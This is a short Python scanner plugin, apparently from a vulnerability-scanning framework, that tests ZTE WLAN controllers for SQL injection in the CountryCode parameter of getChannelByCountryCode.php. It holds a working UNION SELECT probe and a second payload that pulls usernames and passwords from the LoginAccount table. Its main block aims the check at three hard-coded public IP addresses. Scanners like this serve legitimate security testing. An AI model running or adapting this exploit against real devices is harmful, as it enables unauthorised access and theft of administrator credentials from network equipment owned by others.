#!/usr/bin/env python
# -*- coding: utf-8 -*-
#refer: http://www.wooyun.org/bugs/wooyun-2015-0151898
import urlparse
def assign(service, arg):
    if service == "zte":
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
        
def audit(arg):
    payload = "apgroup/getChannelByCountryCode.php"
    url = arg + payload
    postpayload = "CountryCode=' union select 'testvul' || '|'  || 'vulnerable' from LoginAccount --"
    code, head, res, errcode, _ = curl.curl2(url, postpayload)
    if  code ==200 and 'testvul|vulnerable' in res:
        security_hole('zte-wlan sql injection, '+ url + ',post data: '+ "CountryCode=' union select UserName || '|'  || PassWord from LoginAccount --")

if __name__ == '__main__':
    from dummy import *
    audit(assign('zte','https://171.211.225.98/')[1])
    audit(assign('zte','https://223.82.209.82/')[1])
    audit(assign('zte','https://118.112.184.71/')[1])